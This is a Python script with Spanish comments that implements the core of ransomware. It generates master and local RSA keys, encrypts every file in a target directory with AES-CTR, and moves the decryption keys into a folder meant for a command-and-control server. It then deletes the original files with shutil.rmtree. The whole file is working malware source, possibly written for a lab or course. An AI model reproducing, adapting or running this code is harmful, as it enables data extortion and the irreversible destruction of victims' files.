"""@package crypto.py

Módulo encargado del cifrado de los ficheros marcados en el directorio objetivo.
1. Genera el par de clave publico-privada maestra y local
2. Cifra la privada local con la clave publica maestra, para más complejidad, se extrae el exponente privado y se cifra (de tal forma que es mas compleja la regeneración de la clave privada local) 
3. Crea clave simetrica y vector de inicializacion y se cifra el fichero con AES-CTR-128
4. Cifra la clave simetrica con la clave publica local. Se repite paso 3 y 4 tantos ficheros existan.
5. Eliminamos ficheros originales, claves intermedias generadas.
6. Se manda al servidor C&C los ficheros relevantes de descodificación (master.key y local.key)
7. Se elimina rastro de generacion de claves master y local (claves privada y publica tras transferir al C&C)
8. Se hace copia del fichero local_private_key.enc, que contiene el exponente privado para regenerar la clave privada local RSA 2048

Modo de uso:

cripto.py ./ruta_a_encriptar

El resultado es la creación de dos carpetas ../encriptado y ../c&c con los archivos relevantes en cada escenario.
"""
import sys
import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import shutil


####################################################################
#############  FUNCION DE CONCATENACION DE FICHEROS ################
####################################################################
def concat_files(input_files, output_file):
    with open(output_file, 'wb') as out_file:
        for input_file in input_files:
            with open(input_file, 'rb') as in_file:
                out_file.write(in_file.read())

####################################################################
#############  FUNCION DE ENCRIPTADO DE FICHEROS ###################
####################################################################
def processing_file(public_local_key, input_route_file, output_route_file):

    ####################################################################
    ##################  METODO DE ENCRIPTADO ###########################
    ####################################################################
    def encrypt_file(input_file, output_file, encryption_key, iv):
        with open(input_file, 'rb') as file:
            plaintext = file.read()

        cipher = Cipher(algorithms.AES(encryption_key), modes.CTR(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext) + encryptor.finalize()

        with open(output_file, 'wb') as file:
            file.write(ciphertext)
    
    
    #PREDATA: Obtenemos la ruta del fichero y la extension...
    nombre_archivo, extension = os.path.splitext(os.path.basename(input_route_file))


    # 7. Genera aleatoriamente la key y el iv 
    encryption_key = os.urandom(16)  # 16 bytes = 128 bits
    iv = os.urandom(16)  # 16 bytes = 128 bits

    # 8. Usando AES en CTR, cifrar el fichero de texto con encryption_key e iv y llamar al fichero file001.enc
    encrypt_file(input_route_file, nombre_archivo+".enc", encryption_key, iv)

    # 9. Cifrar la clave simetrica (file001.txt.key) con la clave publica local
    with open(nombre_archivo+"."+extension+".key", "wb") as key_file:
        key_file.write(encryption_key)

    ciphertext = public_local_key.encrypt(
        encryption_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open(nombre_archivo+".enc.key", "wb") as encrypted_key_file:
        encrypted_key_file.write(ciphertext)

    # 10. Meter en el inicio del fichero file001.enc, file001.enc.key y el valor del iv
    with open(nombre_archivo+".iv", "wb") as iv_file:
        iv_file.write(iv)

    files_to_concat = [nombre_archivo+'.iv', nombre_archivo+'.enc.key', nombre_archivo+'.enc']
    output_filename = nombre_archivo+extension+'.iv.key.enc'

    concat_files(files_to_concat, output_filename)

    #FINAL: Eliminamos ficheros innecesarios... y movemos el fichero encriptado a su respectiva ruta...
    os.remove(nombre_archivo+".iv")
    os.remove(nombre_archivo+".enc.key")
    os.remove(nombre_archivo+".enc")
    os.remove(nombre_archivo+"."+extension+".key")

    os.makedirs(os.path.dirname(output_route_file), exist_ok=True)
    shutil.move(nombre_archivo+extension+".iv.key.enc", output_route_file+".iv.key.enc")


####################################################################
#######  FUNCION DE OBTENCION DE FICHEROS EN DIRECTORIO ############
####################################################################
def obtener_ficheros_directorio(directorio):
    lista_ficheros = []
    
    for directorio_actual, carpetas, ficheros in os.walk(directorio):
        for fichero in ficheros:
            ruta_completa = os.path.join(directorio_actual, fichero)
            lista_ficheros.append(ruta_completa)

    return lista_ficheros



## Paso 1: Creamos la carpeta con las claves maestra pub-priv key 4096 (exportada en formato binario)
os.mkdir("master")

key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=4096,
    backend=default_backend()
)

private_key_binary = key.private_bytes(
    encoding=serialization.Encoding.DER,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)

with open("master/master.key", "wb") as f:
    f.write(private_key_binary)
    f.close()

master_public_key = key.public_key()


## Paso 2: Creamos la carpeta con las claves locales pub-priv key 2048 (exportada en formato binario)
os.mkdir("local")

key_local = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)

public_local_key = key_local.public_key()

public_key_binary = key_local.public_key().public_bytes(
    encoding=serialization.Encoding.DER,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

#3. Guardar la clave publica en un fichero separado llamada local.public.key
with open("local/local.public.key", "wb") as f:
    f.write(public_key_binary)
    f.close()

#PRE. Vamos a necesitar este fichero más adelante... (fichero clave privada local)
local_private_key_binary = key_local.private_bytes(
    encoding=serialization.Encoding.DER,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)
with open("local/local.key", "wb") as f:
    f.write(local_private_key_binary)
    f.close()

#4. Copia el exponente privado local.private.key (en formato binario)
private_numbers = key_local.private_numbers()
private_exponent = private_numbers.d
local_private_exponent_bytes = private_exponent.to_bytes((private_exponent.bit_length() + 7) // 8, 'big')

with open("local/local.private.key", "wb") as f:
    f.write(local_private_exponent_bytes)

## Esto es para comprobar el estado del exponente privado, se obtiene del fichero exponent.local.private.txt
#formatted_string = '%d' % private_exponent
#with open("local/exponent.local.private.txt", "wb") as f:
#    f.write(formatted_string.encode('utf-8'))

## Paso 3: Con la clave pública maestra cifra la clave privada local local.private.key y vuélcala al archivo local.private.key.enc. 
encrypted_private_key = master_public_key.encrypt(
    local_private_exponent_bytes,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
    )

with open('local_private_key.enc', 'wb') as f:
    f.write(encrypted_private_key)

# 5. En este punto podemos eliminar la carpeta local del sistema de ficheros...


## Paso 4: Aqui empieza el juego de ficheros. Comenzamos el encriptado

#OJO!! Obtener como arg el directorio objetivo...
#directorio_base = './ficheros'
directorio_base = sys.argv[1]

ficheros = obtener_ficheros_directorio(directorio_base)
for fichero in ficheros:
    processing_file(public_local_key, fichero, "../encriptado/"+fichero)

#Guardamos el exponente cifrado en la carpeta de encriptación (local_private_key.enc)
shutil.move("local_private_key.enc", "../encriptado/"+"local_private_key.enc")

#Preparamos la copia de los ficheros necesarios para la deco a proporcionar desde un servicio c&c
os.makedirs('../c&c', exist_ok=True)
#Fichero local.key para descifrar la clave simetrica
shutil.move("local/local.key", "../c&c/"+"local.key")
#Fichero master.key para descifrar el exponente del fichero local_private_key.enc
shutil.move("master/master.key", "../c&c/"+"master.key")

#OJO!! En este punto se deben borrar los ficheros cifrados... y la claves publica y privada generadas...
shutil.rmtree("master")
shutil.rmtree("local")
shutil.rmtree(directorio_base)

### Informacion de los ficheros...
print("Ubicación de los ficheros de encriptado (ficheros *.iv.key.enc y local_private_key.enc): ")
print(os.path.abspath("../encriptado/"))

print("Ficheros complementarios a proporcionar por el C&C (local.key y master.key): ")
print(os.path.abspath("../c&c/"))